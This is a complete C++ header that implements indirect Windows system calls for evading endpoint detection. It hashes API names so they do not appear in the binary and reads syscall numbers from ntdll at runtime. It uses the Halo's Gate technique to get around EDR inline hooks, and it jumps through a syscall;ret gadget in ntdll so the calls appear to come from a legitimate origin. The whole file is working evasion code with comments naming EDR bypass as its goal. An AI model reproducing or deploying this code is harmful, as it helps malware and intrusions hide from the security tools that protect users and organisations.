#pragma once
#include <windows.h>

// =============================================
//  IndirectSyscall.hpp
//
//  Dynamic SSN extraction + Halo's Gate fallback
//  + syscall;ret gadget hunting inside ntdll
//
//  Works across all Windows 10/11 builds —
//  SSNs are resolved at runtime from ntdll stubs
// =============================================

// Globals for the syscall stub
//
// MSVC builds link IndirectSyscall.asm which defines these symbols.
// Clang builds (build_clang.bat) don't use the .asm — define inline.
// USE_MASM_STUB is set in the .vcxproj preprocessor definitions.
extern "C" {
#if defined(USE_MASM_STUB)
    extern DWORD g_SyscallSsn;
    extern PVOID g_SyscallGadget;
#else
    inline DWORD g_SyscallSsn = 0;
    inline PVOID g_SyscallGadget = nullptr;
#endif
}

// naked = no compiler prologue/epilogue
// Inline asm stub replaces IndirectSyscall.asm
#if !defined(USE_MASM_STUB)
__attribute__((naked))
extern "C" NTSTATUS DoIndirectSyscall(...) {
    __asm__(
        ".intel_syntax noprefix     \n\t"
        "mov r10, rcx              \n\t"
        "mov eax, dword ptr [rip + g_SyscallSsn]  \n\t"
        "jmp qword ptr [rip + g_SyscallGadget]     \n\t"
        ".att_syntax prefix        \n\t"
    );
}
#else
// MSVC: keep using IndirectSyscall.asm
extern "C" NTSTATUS DoIndirectSyscall(...);
#endif

namespace Syscall {

    // =============================================
    //  Compile-time djb2 hash — no function name strings in binary
    // =============================================

    constexpr DWORD Hash(const char* s) {
        DWORD h = 5381;
        while (*s) {
            h = ((h << 5) + h) + (unsigned char)*s;
            s++;
        }
        return h;
    }

    // Pre-computed hashes
    constexpr DWORD H_NtOpenKey              = Hash("NtOpenKey");
    constexpr DWORD H_NtClose                = Hash("NtClose");
    constexpr DWORD H_NtEnumerateValueKey    = Hash("NtEnumerateValueKey");
    constexpr DWORD H_NtQueryValueKey        = Hash("NtQueryValueKey");
    constexpr DWORD H_NtOpenFile             = Hash("NtOpenFile");
    constexpr DWORD H_NtQueryInformationFile = Hash("NtQueryInformationFile");
    constexpr DWORD H_NtQueryAttributesFile      = Hash("NtQueryAttributesFile");
    constexpr DWORD H_NtUnmapViewOfSection       = Hash("NtUnmapViewOfSection");
    constexpr DWORD H_NtAllocateVirtualMemory    = Hash("NtAllocateVirtualMemory");
    constexpr DWORD H_NtCreateSection            = Hash("NtCreateSection");
    constexpr DWORD H_NtMapViewOfSection         = Hash("NtMapViewOfSection");
    constexpr DWORD H_NtQueryVirtualMemory       = Hash("NtQueryVirtualMemory");
    constexpr DWORD H_NtGetContextThread         = Hash("NtGetContextThread");
    constexpr DWORD H_NtWriteFile                = Hash("NtWriteFile");
    constexpr DWORD H_NtReadFile                 = Hash("NtReadFile");
    constexpr DWORD H_NtTerminateProcess         = Hash("NtTerminateProcess");
    constexpr DWORD H_NtOpenProcess              = Hash("NtOpenProcess");
    constexpr DWORD H_NtReadVirtualMemory        = Hash("NtReadVirtualMemory");
    constexpr DWORD H_NtFreeVirtualMemory        = Hash("NtFreeVirtualMemory");
    constexpr DWORD H_NtSetInformationFile       = Hash("NtSetInformationFile");
    constexpr DWORD H_NtQueryInformationProcess  = Hash("NtQueryInformationProcess");
    constexpr DWORD H_NtQuerySystemInformation   = Hash("NtQuerySystemInformation");
    constexpr DWORD H_NtProtectVirtualMemory     = Hash("NtProtectVirtualMemory");
    constexpr DWORD H_NtCreateKey                = Hash("NtCreateKey");
    constexpr DWORD H_NtSetValueKey              = Hash("NtSetValueKey");
    constexpr DWORD H_NtDeleteKey                = Hash("NtDeleteKey");
    constexpr DWORD H_NtLoadDriver               = Hash("NtLoadDriver");
    constexpr DWORD H_NtUnloadDriver             = Hash("NtUnloadDriver");
    constexpr DWORD H_NtDeviceIoControlFile      = Hash("NtDeviceIoControlFile");

    // =============================================
    //  Syscall table
    // =============================================

    constexpr int TABLE_SIZE = 29;

    struct Entry {
        DWORD hash;
        DWORD ssn;
    };

    inline Entry g_Table[TABLE_SIZE] = {
        { H_NtOpenKey,              0 },
        { H_NtClose,                0 },
        { H_NtEnumerateValueKey,    0 },
        { H_NtQueryValueKey,        0 },
        { H_NtOpenFile,             0 },
        { H_NtQueryInformationFile, 0 },
        { H_NtQueryAttributesFile,  0 },
        { H_NtUnmapViewOfSection,   0 },
        { H_NtAllocateVirtualMemory,0 },
        { H_NtCreateSection,        0 },
        { H_NtMapViewOfSection,     0 },
        { H_NtQueryVirtualMemory,   0 },
        { H_NtGetContextThread,     0 },
        { H_NtWriteFile,            0 },
        { H_NtReadFile,             0 },
        { H_NtTerminateProcess,     0 },
        { H_NtOpenProcess,          0 },
        { H_NtReadVirtualMemory,    0 },
        { H_NtFreeVirtualMemory,    0 },
        { H_NtSetInformationFile,   0 },
        { H_NtQueryInformationProcess,0 },
        { H_NtQuerySystemInformation, 0 },
        { H_NtProtectVirtualMemory,   0 },
        { H_NtCreateKey,              0 },
        { H_NtSetValueKey,            0 },
        { H_NtDeleteKey,              0 },
        { H_NtLoadDriver,             0 },
        { H_NtUnloadDriver,           0 },
        { H_NtDeviceIoControlFile,    0 },
    };

    inline PVOID g_Gadget = nullptr;

    // =============================================
    //  Get ntdll base from PEB — zero imports
    //  InLoadOrderModuleList: [0]=exe, [1]=ntdll
    // =============================================

    __forceinline BYTE* GetNtdllBase() {
#if defined(_M_X64)
        auto peb = (BYTE*)__readgsqword(0x60);
#else
        auto peb = (BYTE*)__readfsdword(0x30);
#endif
        // PEB->Ldr
        auto ldr = *(BYTE**)(peb + 0x18);

        // PEB_LDR_DATA->InLoadOrderModuleList.Flink (first LDR_DATA_TABLE_ENTRY)
        auto first = *(BYTE**)(ldr + 0x10);

        // Follow Flink to second entry (ntdll)
        auto second = *(BYTE**)(first);

        // LDR_DATA_TABLE_ENTRY->DllBase
#if defined(_M_X64)
        auto dllBase = *(BYTE**)(second + 0x30);
#else
        auto dllBase = *(BYTE**)(second + 0x18);
#endif
        return dllBase;
    }

    // =============================================
    //  Runtime djb2 hash (same algo as compile-time)
    // =============================================

    __forceinline DWORD HashRuntime(const char* s) {
        DWORD h = 5381;
        while (*s) {
            h = ((h << 5) + h) + (unsigned char)*s;
            s++;
        }
        return h;
    }

    // =============================================
    //  Extract SSN from ntdll stub
    //
    //  Clean stub (Windows 10/11):
    //    4C 8B D1        mov r10, rcx
    //    B8 XX XX XX XX  mov eax, <SSN>
    //    F6 04 25 ...    test byte ptr [SharedUserData], ...
    //    75 03           jne +3
    //    0F 05           syscall
    //    C3              ret
    //    CD 2E           int 2Eh
    //    C3              ret
    //
    //  Hooked stub (EDR/AV inline hook):
    //    E9 XX XX XX XX  jmp <hook>  (5 byte jmp overwrites first 5 bytes)
    //    or
    //    FF 25 ...       jmp [rip+xx] (6 bytes)
    //
    //  Halo's Gate: if hooked, walk neighbor stubs at 0x20 stride
    //  and infer SSN from clean neighbor (SSNs are sequential)
    // =============================================

    __forceinline bool ExtractSsn(BYTE* funcAddr, DWORD* ssn) {
        // Direct read — clean stub
        if (funcAddr[0] == 0x4C && funcAddr[1] == 0x8B &&
            funcAddr[2] == 0xD1 && funcAddr[3] == 0xB8) {
            *ssn = *(DWORD*)(funcAddr + 4);
            return true;
        }

        // ---- Halo's Gate ----
        // Syscall stubs in ntdll are 0x20 (32) bytes each, laid out sequentially.
        // If our target is hooked, walk to nearest clean neighbor and compute offset.

        // Search UP (lower SSNs)
        for (DWORD i = 1; i <= 500; i++) {
            BYTE* p = funcAddr - (i * 0x20);
            if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
                *ssn = *(DWORD*)(p + 4) + i;
                return true;
            }
        }

        // Search DOWN (higher SSNs)
        for (DWORD i = 1; i <= 500; i++) {
            BYTE* p = funcAddr + (i * 0x20);
            if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
                *ssn = *(DWORD*)(p + 4) - i;
                return true;
            }
        }

        return false;
    }

    // =============================================
    //  Find syscall;ret gadget in ntdll .text section
    //
    //  We jump to this gadget instead of executing our own syscall
    //  instruction. This way the return address on the kernel stack
    //  points inside ntdll — EDRs that validate syscall origin see
    //  a legitimate call from ntdll, not from our module.
    // =============================================

    __forceinline PVOID FindGadget(BYTE* ntdllBase) {
        auto dosHdr = (IMAGE_DOS_HEADER*)ntdllBase;
        auto ntHdr = (IMAGE_NT_HEADERS*)(ntdllBase + dosHdr->e_lfanew);
        auto sec = IMAGE_FIRST_SECTION(ntHdr);

        for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
            if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                BYTE* start = ntdllBase + sec[i].VirtualAddress;
                DWORD size = sec[i].Misc.VirtualSize;

                for (DWORD j = 0; j < size - 2; j++) {
                    // 0F 05  syscall
                    // C3     ret
                    if (start[j] == 0x0F && start[j + 1] == 0x05 && start[j + 2] == 0xC3) {
                        return &start[j];
                    }
                }
            }
        }
        return nullptr;
    }

    // =============================================
    //  Initialize syscall table
    //  Walks ntdll PE export directory, matches by hash,
    //  extracts SSN from each stub
    // =============================================

    __declspec(noinline) bool Init() {
        BYTE* ntdll = GetNtdllBase();
        if (!ntdll) return false;

        // Validate MZ + PE
        if (ntdll[0] != 'M' || ntdll[1] != 'Z') return false;

        g_Gadget = FindGadget(ntdll);
        if (!g_Gadget) return false;

        auto dosHdr = (IMAGE_DOS_HEADER*)ntdll;
        auto ntHdr = (IMAGE_NT_HEADERS*)(ntdll + dosHdr->e_lfanew);
        auto& expEntry = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (expEntry.VirtualAddress == 0) return false;

        auto exp = (IMAGE_EXPORT_DIRECTORY*)(ntdll + expEntry.VirtualAddress);
        auto names = (DWORD*)(ntdll + exp->AddressOfNames);
        auto funcs = (DWORD*)(ntdll + exp->AddressOfFunctions);
        auto ords  = (WORD*)(ntdll + exp->AddressOfNameOrdinals);

        int resolved = 0;

        for (DWORD i = 0; i < exp->NumberOfNames && resolved < TABLE_SIZE; i++) {
            const char* name = (const char*)(ntdll + names[i]);

            // Quick filter: only process Nt* exports (skip everything else)
            if (name[0] != 'N' || name[1] != 't') continue;

            DWORD h = HashRuntime(name);

            for (int t = 0; t < TABLE_SIZE; t++) {
                if (g_Table[t].hash == h && g_Table[t].ssn == 0) {
                    BYTE* funcAddr = ntdll + funcs[ords[i]];
                    if (ExtractSsn(funcAddr, &g_Table[t].ssn))
                        resolved++;
                    break;
                }
            }
        }

        return (resolved == TABLE_SIZE);
    }

    // =============================================
    //  SSN lookup by hash
    // =============================================

    __forceinline DWORD GetSsn(DWORD hash) {
        for (int i = 0; i < TABLE_SIZE; i++) {
            if (g_Table[i].hash == hash)
                return g_Table[i].ssn;
        }
        return 0;
    }

    // =============================================
    //  Prepare globals for asm stub, return stub address
    // =============================================

    __forceinline void Prep(DWORD hash) {
        g_SyscallSsn = GetSsn(hash);
        g_SyscallGadget = g_Gadget;
    }

} // namespace Syscall

// =============================================
//  Dispatch macro
//
//  Usage:
//    NTSTATUS st = ISYSCALL(NtOpenKey)(&hKey, KEY_READ, &oa);
//
//  Comma operator ensures Prep() runs before the call.
//  Cast to decltype(&Name) preserves the function signature
//  so the compiler sets up args correctly.
// =============================================

#define ISYSCALL(name) \
    (Syscall::Prep(Syscall::H_##name), ((decltype(&name))DoIndirectSyscall))
